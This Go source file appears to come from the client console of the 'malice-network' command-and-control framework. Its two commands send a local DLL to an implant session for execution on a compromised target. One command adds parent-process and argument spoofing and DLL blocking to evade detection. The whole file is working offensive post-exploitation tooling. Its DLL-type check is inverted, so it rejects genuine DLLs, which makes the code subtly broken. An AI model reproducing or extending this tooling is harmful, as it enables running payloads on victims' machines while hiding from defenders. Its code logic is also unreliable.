package exec

import (
	"github.com/chainreactors/grumble"
	"github.com/chainreactors/malice-network/client/console"
	"github.com/chainreactors/malice-network/helper/consts"
	"github.com/chainreactors/malice-network/helper/helper"
	"github.com/chainreactors/malice-network/proto/implant/implantpb"
	"google.golang.org/protobuf/proto"
	"os"
	"strings"
)

func ExecuteDLLCmd(ctx *grumble.Context, con *console.Console) {
	session := con.ActiveTarget.GetInteractive()
	if session == nil {
		return
	}
	sid := con.ActiveTarget.GetInteractive().SessionId
	ppid := ctx.Flags.Uint("ppid")
	pePath := ctx.Args.String("path")
	paramString := ctx.Flags.String("args")
	argue := ctx.Flags.String("argue")
	isBlockDll := ctx.Flags.Bool("block_dll")
	dllBin, err := os.ReadFile(pePath)
	if err != nil {
		console.Log.Errorf("%s\n", err.Error())
		return
	}
	if helper.CheckPEType(dllBin) == consts.DLLFile {
		console.Log.Errorf("The file is not a DLL file\n")
		return
	}
	shellcodeTask, err := con.Rpc.ExecutePE(con.ActiveTarget.Context(), &implantpb.ExecutePE{
		Name: consts.ModuleExecutePE,
		Bin:  dllBin,
		Sacrifice: &implantpb.SacrificeProcess{
			Output:   true,
			BlockDll: isBlockDll,
			Ppid:     uint32(ppid),
			Argue:    argue,
			Params:   strings.Split(paramString, ","),
		},
	})

	if err != nil {
		con.SessionLog(sid).Errorf("%s\n", err)
		return
	}

	con.AddCallback(shellcodeTask.TaskId, func(msg proto.Message) {
		resp := msg.(*implantpb.Spite)
		if !(resp.Status.Error != "") {
			con.SessionLog(sid).Consolef("Executed PE on target: %s\n", resp.GetAssemblyResponse().GetData())
		}
	})
}

func InlineDLLCmd(ctx *grumble.Context, con *console.Console) {
	session := con.ActiveTarget.GetInteractive()
	if session == nil {
		return
	}
	sid := con.ActiveTarget.GetInteractive().SessionId
	pePath := ctx.Args.String("path")
	dllBin, err := os.ReadFile(pePath)
	if err != nil {
		console.Log.Errorf("%s\n", err.Error())
		return
	}
	if helper.CheckPEType(dllBin) == consts.DLLFile {
		console.Log.Errorf("The file is not a DLL file\n")
		return
	}
	shellcodeTask, err := con.Rpc.ExecutePE(con.ActiveTarget.Context(), &implantpb.ExecutePE{
		Name: consts.ModuleExecutePE,
		Bin:  dllBin,
	})

	if err != nil {
		con.SessionLog(sid).Errorf("%s\n", err)
		return
	}

	con.AddCallback(shellcodeTask.TaskId, func(msg proto.Message) {
		resp := msg.(*implantpb.Spite)
		if !(resp.Status.Error != "") {
			con.SessionLog(sid).Consolef("Executed PE on target: %s\n", resp.GetAssemblyResponse().GetData())
		}
	})
}
